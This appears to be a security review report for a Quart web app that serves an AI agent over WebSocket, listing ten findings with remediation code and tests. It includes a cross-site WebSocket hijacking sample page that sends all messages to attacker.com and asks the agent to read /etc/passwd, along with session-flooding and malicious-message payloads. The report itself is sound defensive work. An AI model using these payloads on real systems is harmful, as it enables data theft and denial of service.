  Security Review Report: Quart Webapp Framework (Task 7.1)

  Executive Summary

  The Quart webapp foundation presents foundational security risks due to its role as the entry point for all
  web interactions. While task 7.1 intentionally defers authentication (task 7.3) and session management (task
  7.4), the foundation must be built with security architecture that supports future hardening. This analysis
  identifies 2 Critical, 3 High, and 4 Medium severity findings requiring architectural decisions now to avoid
  costly refactoring later.

  Critical Risk: WebSocket connections bypass traditional CORS protections, creating Cross-Site WebSocket
  Hijacking (CSWSH) vulnerability. Origin validation is entirely the server's responsibility and must be
  implemented even in MVP.

  ---
  Critical Findings (CVSS 9.0-10.0)

  1. Cross-Site WebSocket Hijacking (CSWSH) - CVSS 9.1

  OWASP A07:2025 Authentication Failures, A01:2025 Broken Access Control

  Description: WebSocket connections do not follow the Same Origin Policy. The browser sends the Origin header
  but does not enforce CORS. Any website can open a WebSocket connection to the yoker webapp server.

  Impact:
  - Attacker can send messages as authenticated user
  - Attacker can read all responses (thinking, content, tool calls)
  - Complete compromise of agent capabilities
  - Data exfiltration of conversation history

  Attack Example:
  // Malicious site: https://attacker.com/evil.html
  <script>
  const ws = new WebSocket('ws://localhost:5000/ws/chat');
  ws.onmessage = (event) => {
    fetch('https://attacker.com/log', { method: 'POST', body: event.data });
  };
  ws.onopen = () => {
    ws.send(JSON.stringify({type: 'message', content: 'Read /etc/passwd'}));
  };
  </script>

  Remediation: Validate Origin header on WebSocket handshake. MUST be implemented in task 7.1.

  Code Fix (middleware/cors.py):
  from urllib.parse import urlparse
  from typing import Sequence

  def validate_websocket_origin(origin: str, allowed_origins: Sequence[str]) -> bool:
      """Validate WebSocket origin header to prevent CSWSH.

      WebSocket connections do not enforce CORS. The server must validate
      the Origin header to prevent Cross-Site WebSocket Hijacking.
      """
      if not origin:
          return False

      try:
          parsed = urlparse(origin)
          hostname = parsed.hostname or ""
          port = f":{parsed.port}" if parsed.port else ""
          normalized_origin = f"{parsed.scheme}://{hostname}{port}"
      except Exception:
          return False

      for allowed in allowed_origins:
          parsed_allowed = urlparse(allowed)
          allowed_hostname = parsed_allowed.hostname or ""
          allowed_port = f":{parsed_allowed.port}" if parsed_allowed.port else ""
          allowed_normalized = f"{parsed_allowed.scheme}://{allowed_hostname}{allowed_port}"

          if normalized_origin == allowed_normalized:
              return True

      return False

  Usage in Routes (routes/chat.py):
  from quart import websocket, abort
  from yoker.webapp.middleware.cors import validate_websocket_origin

  @chat_bp.websocket("/ws/chat")
  async def chat_websocket():
      # CRITICAL: Validate origin before accepting connection
      origin = websocket.headers.get("Origin", "")
      config = websocket.config["YOKER_CONFIG"]

      if not validate_websocket_origin(origin, config.webapp.cors_origins):
          logger.warning(f"Rejected WebSocket connection from origin: {origin}")
          abort(403, description="Origin not allowed")

      # Proceed with connection...

  ---
  2. Missing Authentication Architecture - CVSS 9.0

  OWASP A01:2025 Broken Access Control, A07:2025 Authentication Failures

  Description: Task 7.1 intentionally defers authentication to task 7.3. However, the current architecture
  lacks hooks for authentication middleware, making it difficult to add authentication later without
  significant refactoring.

  Impact:
  - Agent capabilities exposed to unauthenticated users
  - No way to associate requests with users
  - No session isolation
  - No rate limiting per user

  Remediation: Implement authentication architecture hooks (NOT authentication itself) in task 7.1.

  Code Fix (middleware/auth.py - NEW FILE):
  from quart import websocket, abort, g
  from typing import TYPE_CHECKING, Callable, Awaitable
  from functools import wraps

  if TYPE_CHECKING:
      from yoker.agent import Agent

  class AuthenticationResult:
      """Result of authentication check.

      Placeholder for task 7.3 - will be extended with:
      - user_id: str
      - api_key: str (Ollama API key)
      - session_id: str
      """
      authenticated: bool
      error_message: str | None

      def __init__(self, authenticated: bool, error_message: str | None = None):
          self.authenticated = authenticated
          self.error_message = error_message

  async def check_authentication() -> AuthenticationResult:
      """Check authentication for WebSocket connection.

      MVP (task 7.1): Allows all connections.
      Production (task 7.3+): Requires valid authentication.
      """
      # SECURITY WARNING: This MUST be replaced before production
      return AuthenticationResult(authenticated=True)

  def login_required(func: Callable[..., Awaitable]) -> Callable[..., Awaitable]:
      """Decorator for authentication-protected WebSocket endpoints."""
      @wraps(func)
      async def wrapper(*args, **kwargs):
          result = await check_authentication()

          if not result.authenticated:
              logger.warning(f"Authentication failed: {result.error_message}")
              abort(401, description=result.error_message or "Authentication required")

          return await func(*args, **kwargs)

      return wrapper

  Usage (routes/chat.py):
  from yoker.webapp.middleware.auth import login_required

  @chat_bp.websocket("/ws/chat")
  @login_required  # Architecture for task 7.3 authentication
  async def chat_websocket():
      # g.user_context will contain user_id, api_key, session_id (task 7.4)
      pass

  ---
  High Findings (CVSS 7.0-8.9)

  3. In-Memory Session Management Without Expiration - CVSS 8.1

  OWASP A01:2025 Broken Access Control, A02:2025 Security Misconfiguration

  Description: The SessionManager placeholder stores sessions in-memory without expiration, cleanup, or
  persistence. Sessions persist indefinitely, consuming memory and allowing unlimited session creation.

  Attack Example:
  # Attacker creates unlimited sessions to exhaust memory
  for i in range(10000):
      ws = await websockets.connect("ws://localhost:5000/ws/chat")
      # Each connection creates a new Agent instance
      # No expiration, no cleanup → memory exhaustion

  Remediation: Implement session limits, expiration, and cleanup (even in MVP).

  Code Fix (session/manager.py):
  import time
  from dataclasses import dataclass

  @dataclass
  class SessionInfo:
      session_id: str
      agent: "Agent"
      created_at: float
      last_activity: float

  class SessionManager:
      def __init__(
          self,
          max_sessions: int = 100,
          session_timeout_seconds: int = 1800,  # 30 minutes
      ):
          self._sessions: dict[str, SessionInfo] = {}
          self._max_sessions = max_sessions
          self._session_timeout = session_timeout_seconds

      def create_session(self, session_id: str, agent: "Agent") -> None:
          # Check session limit (DoS protection)
          if len(self._sessions) >= self._max_sessions:
              raise SessionLimitError(
                  f"Maximum sessions ({self._max_sessions}) reached. Try again later."
              )

          now = time.time()
          self._sessions[session_id] = SessionInfo(
              session_id=session_id,
              agent=agent,
              created_at=now,
              last_activity=now,
          )

      def get_session(self, session_id: str) -> "Agent | None":
          session = self._sessions.get(session_id)
          if not session:
              return None

          # Check expiration
          if time.time() - session.last_activity > self._session_timeout:
              self.remove_session(session_id)
              return None

          session.last_activity = time.time()
          return session.agent

  ---
  4. WebSocket Message Injection Without Validation - CVSS 7.5

  OWASP A05:2025 Injection

  Description: WebSocket messages are parsed with json.loads(data) without schema validation. Malformed or
  malicious messages could cause unexpected behavior.

  Attack Examples:
  // Missing field
  ws.send('{"type": "message"}');  // No content field

  // Oversized content (DoS)
  ws.send('{"type": "message", "content": "' + 'A'.repeat(10000000) + '"}');

  // Prototype pollution attempt
  ws.send('{"type": "message", "__proto__": {"polluted": "data"}}');

  Remediation: Implement schema validation for WebSocket messages.

  Code Fix (routes/chat.py):
  from dataclasses import dataclass
  from typing import Literal
  from yoker.exceptions import ValidationError

  @dataclass
  class WebSocketMessage:
      type: Literal["message"]
      content: str

      @classmethod
      def from_json(cls, data: str, max_content_length: int = 100_000) -> "WebSocketMessage":
          """Parse and validate WebSocket message."""
          try:
              obj = json.loads(data)
          except json.JSONDecodeError as e:
              raise ValidationError(f"Invalid JSON: {e}")

          if not isinstance(obj, dict):
              raise ValidationError(f"Message must be an object, got {type(obj).__name__}")

          if "type" not in obj:
              raise ValidationError("Missing required field: type")

          if obj["type"] != "message":
              raise ValidationError(f"Unsupported message type: {obj['type']}")

          if "content" not in obj:
              raise ValidationError("Missing required field: content")

          if not isinstance(obj["content"], str):
              raise ValidationError(f"content must be a string")

          if len(obj["content"]) > max_content_length:
              raise ValidationError(f"Content exceeds maximum length ({max_content_length})")

          return cls(type="message", content=obj["content"])

  ---
  5. CORS Misconfiguration Risk - CVSS 7.3

  OWASP A02:2025 Security Misconfiguration

  Description: The CORS configuration uses allow_origin from configuration, but production deployments require
  explicit origin allowlists. Wildcards (*) would allow any origin.

  Remediation: Environment-aware CORS configuration with production hardening.

  Code Fix (middleware/cors.py):
  import os

  def configure_cors(app: Quart, config: "WebappConfig") -> None:
      """Configure CORS with production validation."""
      is_production = os.environ.get("YOKER_ENV", "development") == "production"

      if is_production:
          _validate_production_cors(config.cors_origins)

      app = cors(
          app,
          allow_origin=list(config.cors_origins),
          allow_methods=["GET", "POST", "OPTIONS", "WEBSOCKET"],
          allow_headers=["Content-Type", "Authorization"],
          allow_credentials=True,
          max_age=3600,
      )

  def _validate_production_cors(cors_origins: Sequence[str]) -> None:
      """Validate CORS configuration for production."""
      if not cors_origins:
          raise SecurityError("Production CORS requires at least one allowed origin.")

      if "*" in cors_origins:
          raise SecurityError("Production CORS must not use wildcard '*'. Specify explicit origins.")

  ---
  Medium Findings (CVSS 4.0-6.9)

  6. Health Endpoint Information Disclosure - CVSS 5.3

  Description: The /health endpoint returns version information which aids vulnerability targeting.

  Remediation: Make version disclosure configurable (disabled in production by default).

  @health_bp.route("/health")
  async def health_check():
      response = {"status": "healthy"}

      # Add version only if configured
      config = current_app.config["YOKER_CONFIG"]
      if config.webapp.debug or os.environ.get("YOKER_SHOW_VERSION"):
          from yoker import __version__
          response["version"] = __version__

      return jsonify(response)

  ---
  7. Dependency Security (Quart, quart-cors) - CVSS 5.0

  Status: ✅ No known CVEs for quart or quart-cors (as of 2026-05-06).

  Recommendation:
  - Pin versions: quart>=0.19.0,<0.21.0, quart-cors>=0.7.0,<0.9.0
  - Add dependency scanning: safety and pip-audit in CI/CD
  - Monitor Snyk for vulnerabilities

  References:
  - Snyk: quart-cors - No known vulnerabilities
  - quart-cors GitHub

  ---
  8. Missing Security Event Logging - CVSS 4.7

  Description: No security event logging (connections, auth failures, validation errors) makes incident
  detection difficult.

  Remediation: Create logging/security.py module for comprehensive security logging.

  # logging/security.py

  class SecurityEventType:
      WS_CONNECTION_OPENED = "ws_connection_opened"
      WS_CONNECTION_CLOSED = "ws_connection_closed"
      WS_ORIGIN_REJECTED = "ws_origin_rejected"
      WS_MESSAGE_INVALID = "ws_message_invalid"
      AUTH_SESSION_CREATED = "auth_session_created"
      AUTH_SESSION_EXPIRED = "auth_session_expired"
      RATE_LIMIT_EXCEEDED = "rate_limit_exceeded"

  def log_security_event(event_type: str, severity: str, details: dict, request_id: str | None = None):
      """Log security events with sanitized details."""
      sanitized = _sanitize_details(details)  # Never log passwords, tokens
      logger.info("security_event", event_type=event_type, severity=severity, **sanitized)

  ---
  9. WebSocket Error Handling May Leak Information - CVSS 4.3

  Description: Generic try/except blocks may expose stack traces to clients.

  Remediation: Implement error sanitization.

  try:
      # Process message
      pass
  except ValidationError as e:
      # Client errors: safe to send details
      await websocket.send(json.dumps({"type": "error", "message": str(e)}))
  except YokerError as e:
      # Application errors: log details, send generic message
      logger.error(f"Application error: {e}", exc_info=True)
      await websocket.send(json.dumps({"type": "error", "message": "An error occurred"}))
  except Exception as e:
      # Unexpected errors: never send stack trace
      logger.critical(f"Unexpected error: {e}", exc_info=True)
      await websocket.send(json.dumps({"type": "error", "message": "An unexpected error occurred"}))

  ---
  Low Findings (CVSS 0.1-3.9)

  10. Development Mode Debug Exposure - CVSS 3.1

  Description: Quart debug mode enables detailed error pages with stack traces.

  Remediation: Block debug mode in production.

  # __main__.py
  if is_production and (debug or cfg.webapp.debug):
      print("ERROR: Debug mode cannot be enabled in production", file=sys.stderr)
      sys.exit(1)

  ---
  Security Architecture Recommendations

  Immediate Actions (Task 7.1 - MUST Implement)

  1. WebSocket Origin Validation (Critical)
    - Add validate_websocket_origin() in middleware/cors.py
    - Apply validation in WebSocket handshake
    - Reject with 403 Forbidden for invalid origins
    - Log rejected origins
  2. Authentication Architecture (Critical)
    - Create middleware/auth.py with hooks
    - Add @login_required decorator
    - Placeholder allows all connections (MVP)
  3. Session Limits (High)
    - Add max_sessions limit (default 100)
    - Add session timeout (default 30 minutes)
    - Automatic cleanup of expired sessions
  4. Message Schema Validation (High)
    - Create WebSocketMessage dataclass
    - Validate type and content fields
    - Add content length limits (100KB)
  5. Security Event Logging (Medium)
    - Create logging/security.py module
    - Log connections, auth failures, validation errors
    - Never log sensitive data

  Future Tasks (7.2-7.11)

  Task 7.2: SMTP credential validation, secure storage
  Task 7.3: Implement check_authentication(), CSRF tokens, rate limiting
  Task 7.4: Persistent sessions, JWT/server-side tokens, API key storage
  Task 7.11: HTTPS enforcement, security headers, rate limiting, Docker hardening

  ---
  Test Cases for Security Validation

  # Critical: CSWSH prevention
  class TestWebSocketOriginValidation:
      @pytest.mark.asyncio
      async def test_origin_validation_rejects_unauthorized(self):
          app = create_app(WebappConfig(cors_origins=("http://localhost:3000",)))

          async with app.test_client() as client:
              with pytest.raises(WebsocketResponseError) as exc_info:
                  async with client.websocket("/ws/chat", headers={"Origin": "http://attacker.com"}):
                      pass

              assert exc_info.value.response.status_code == 403

  # High: DoS prevention
  class TestSessionManagement:
      def test_session_limit_enforced(self):
          manager = SessionManager(max_sessions=2)
          manager.create_session("s1", mock_agent)
          manager.create_session("s2", mock_agent)

          with pytest.raises(SessionLimitError):
              manager.create_session("s3", mock_agent)

  # High: Message injection prevention
  class TestWebSocketMessageValidation:
      def test_rejects_missing_content_field(self):
          with pytest.raises(ValidationError) as exc_info:
              WebSocketMessage.from_json('{"type": "message"}')

          assert "Missing required field: content" in str(exc_info.value)

  ---
  Vulnerability Classification Summary

  ┌──────────────────────────────┬──────┬────────────────┬─────────────────────────────────────────────────┐
  │           Finding            │ CVSS │ Classification │                     Action                      │
  ├──────────────────────────────┼──────┼────────────────┼─────────────────────────────────────────────────┤
  │ CSWSH vulnerability          │ 9.1  │ Blocking       │ Implement origin validation in task 7.1         │
  ├──────────────────────────────┼──────┼────────────────┼─────────────────────────────────────────────────┤
  │ Missing auth architecture    │ 9.0  │ Blocking       │ Add authentication hooks in task 7.1            │
  ├──────────────────────────────┼──────┼────────────────┼─────────────────────────────────────────────────┤
  │ In-memory session management │ 8.1  │ Related        │ Implement limits in task 7.1, persistence in    │
  │                              │      │                │ task 7.4                                        │
  ├──────────────────────────────┼──────┼────────────────┼─────────────────────────────────────────────────┤
  │ Message injection            │ 7.5  │ Related        │ Add schema validation in task 7.1               │
  ├──────────────────────────────┼──────┼────────────────┼─────────────────────────────────────────────────┤
  │ CORS misconfiguration        │ 7.3  │ Related        │ Add production validation in task 7.1           │
  ├──────────────────────────────┼──────┼────────────────┼─────────────────────────────────────────────────┤
  │ Health endpoint info         │ 5.3  │ New            │ Make version configurable                       │
  │ disclosure                   │      │                │                                                 │
  ├──────────────────────────────┼──────┼────────────────┼─────────────────────────────────────────────────┤
  │ Dependency security          │ 5.0  │ New            │ Pin versions, add security scanning             │
  ├──────────────────────────────┼──────┼────────────────┼─────────────────────────────────────────────────┤
  │ Missing security logging     │ 4.7  │ New            │ Add security event logging                      │
  ├──────────────────────────────┼──────┼────────────────┼─────────────────────────────────────────────────┤
  │ Error handling info leak     │ 4.3  │ New            │ Sanitize error responses                        │
  ├──────────────────────────────┼──────┼────────────────┼─────────────────────────────────────────────────┤
  │ Debug mode exposure          │ 3.1  │ New            │ Block debug in production                       │
  └──────────────────────────────┴──────┴────────────────┴─────────────────────────────────────────────────┘

  ---
  Security Checklist for Task 7.1

  Critical (MUST implement)

  - WebSocket origin validation function in middleware/cors.py
  - Origin validation applied in WebSocket handshake
  - 403 Forbidden response for invalid origins
  - Security event logging for rejected origins
  - Authentication architecture in middleware/auth.py
  - @login_required decorator for WebSocket routes
  - Placeholder authentication (allows all for MVP)

  High (SHOULD implement)

  - Session limits in SessionManager (max_sessions)
  - Session expiration in SessionManager (timeout)
  - WebSocket message schema validation
  - Message content length limits
  - CORS production validation (reject wildcards)

  Medium (NICE to implement)

  - Security event logging module (logging/security.py)
  - Error handling with sanitization
  - Version disclosure configuration
  - Dependency version pinning
  - Security scanning in CI/CD

  ---
  Sources

  - OWASP WebSocket Security Cheat Sheet
  - Quart WebSocket Documentation
  - Quart-Auth WebSocket Authentication
  - quart-cors Repository
  - Snyk: quart-cors Vulnerability Report
  - PyPI: quart-cors
  - WebSocket CORS Explained
